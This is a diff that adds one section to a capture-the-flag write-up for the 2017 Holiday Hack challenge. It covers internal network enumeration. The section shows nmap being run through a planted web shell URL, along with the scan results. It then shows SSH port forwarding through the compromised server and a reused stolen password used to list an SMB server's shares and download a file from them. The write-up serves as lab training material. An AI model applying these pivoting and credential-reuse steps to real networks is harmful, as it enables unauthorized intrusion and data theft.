@@ -174,3 +174,151 @@ alabaster_snowball@l2s:/tmp/asnow.vZQOUSD0GKHr8q1lf97RX9cq$
 ```
 
 Alabaster Snowball's password is `stream_unhappy_buy_loss`.
+
+
+# 3) The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?
+
+For some reason, `nmap` is already installed on the Letters to Santa system. We are also told that
+the server we are looking for is in the 10.142.0.0/24 subnet from the scope section:
+
+> SCOPE: For this entire challenge, you are authorized to attack ONLY the Letters to Santa system at l2s.northpolechristmastown.com AND other systems on the internal 10.142.0.0/24 network that you access through the Letters to Santa system. 
+
+Since we are looking for an SMB server, we also have to tell nmap to include the standard TCP port used by SMB (445)
+in its scan. This is also made clear from the first hint to the level:
+
+> Nmap has default host discovery checks that may not discover all hosts. To customize which ports Nmap looks for during host discovery, use -PS with a port number, such as -PS123 to check TCP port 123 to determine if a host is up.
+>
+> -- Holly Evergreen, Hint 1
+
+Performing the scan (again using the web shell from before), we find a couple of internal servers:
+
+```
+$ nmap -PS445 10.142.0.0/24
+https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=nmap%20-PS445%2010.142.0.0/24
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-16 14:50 UTC
+Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
+Host is up (0.00022s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
+Host is up (0.00020s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+4444/tcp open  krb524
+5555/tcp open  freeciv
+
+Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
+Host is up (0.00021s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+389/tcp  open  ldap
+8080/tcp open  http-proxy
+
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Host is up (0.00072s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
+Host is up (0.00012s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 256 IP addresses (5 hosts up) scanned in 6.46 seconds
+```
+
+Currently we are only intrested in the smb server, `hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)`.
+We want to find the file server share name and to do so we probably have to talk to the server over the
+smb protocol. The [`smbclient`](http://www.tldp.org/HOWTO/SMB-HOWTO-8.html), which seems to be included by
+default for at least Ubuntu, should do fine.
+
+There is a problem though, we do not seem to be able to run `smbclient` via our web shell:
+
+```
+$ smbclient || echo failed
+https://l2s.northpolechristmastown.com/.K2tN5T3RX2x6j2NnZ3W1.php?e=smbclient%20||%20echo%20failed
+
+failed
+```
+
+Fourtunately, we do have ssh access to the letters to santa server. Logging in directly to the
+server brings us to a very locked down account that is of no real use. But, ssh can also be used
+to forward traffic on local ports via the remote host. Using ssh port forwarding, we can setup
+a connection to the internal smb server via the letters to santa server:
+
+```
+peter@peter-VirtualBox:~$ ssh -N -L 4455:hhc17-smb-server.c.holidayhack2017.internal:445 alabaster_snowball@l2s.northpolechristmastown.com
+```
+
+The command forwards connection on the local port 4455 to port 445 on the 
+`hhc17-smb-server.c.holidayhack2017.internal` server, via the ssh connection
+to `l2s.northpolechristmastown.com`. We can then point the `smbclient` to our 
+local port 4455 and we are able to talk to the internal smb server.
+
+The only thing remaining now is the username and password. But it turns out that
+Alabaster Snowball is rather lazy... Reusing the same combination grants us access
+also on the smb server:
+
+```
+peter@peter-VirtualBox:~$ smbclient -L localhost -p 4455 -U alabaster_snowball%stream_unhappy_buy_loss
+Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	FileStor        Disk      
+	IPC$            IPC       Remote IPC
+```
+
+Having found the name of the shares, let's try connecting to them. Both the
+`ADMIN$` and `C$` give us an error saying `NT_STATUS_BAD_NETWORK_NAME`. Google
+helps us translate this to mean that we are not allowed to access those Disks.
+We can connect to the `FileStor` disk though:
+
+```
+$ smbclient '\\localhost\FileStor\' -p 4455 -U alabaster_snowball%stream_unhappy_buy_loss
+Domain=[HHC17-EMI] OS=[Windows Server 2016 Datacenter 14393] Server=[Windows Server 2016 Datacenter 6.3]
+smb: \> 
+```
+
+Using the `ls` and `get` command, we find and retreive the next book page (the other files did not have much useful content in them):
+
+```
+smb: \> ls
+  .                                   D        0  Wed Dec  6 22:51:46 2017
+  ..                                  D        0  Wed Dec  6 22:51:46 2017
+  BOLO - Munchkin Mole Report.docx      A   255520  Wed Dec  6 22:44:17 2017
+  GreatBookPage3.pdf                  A  1275756  Mon Dec  4 20:21:44 2017
+  MEMO - Calculator Access for Wunorse.docx      A   111852  Mon Nov 27 20:01:36 2017
+  MEMO - Password Policy Reminder.docx      A   133295  Wed Dec  6 22:47:28 2017
+  Naughty and Nice List.csv           A    10245  Thu Nov 30 20:42:00 2017
+  Naughty and Nice List.docx          A    60344  Wed Dec  6 22:51:25 2017
+
+		13106687 blocks of size 4096. 9627423 blocks available
+
+smb: \> get GreatBookPage3.pdf
+```
+
+With that, the task is complete!
+
+The file server share name is "FileStor".
+The sha1 of [GreatBookPage3.pdf](book/GreatBookPage3.pdf)
+is `57737da397cbfda84e88b573cd96d45fcf34a5da`.
+
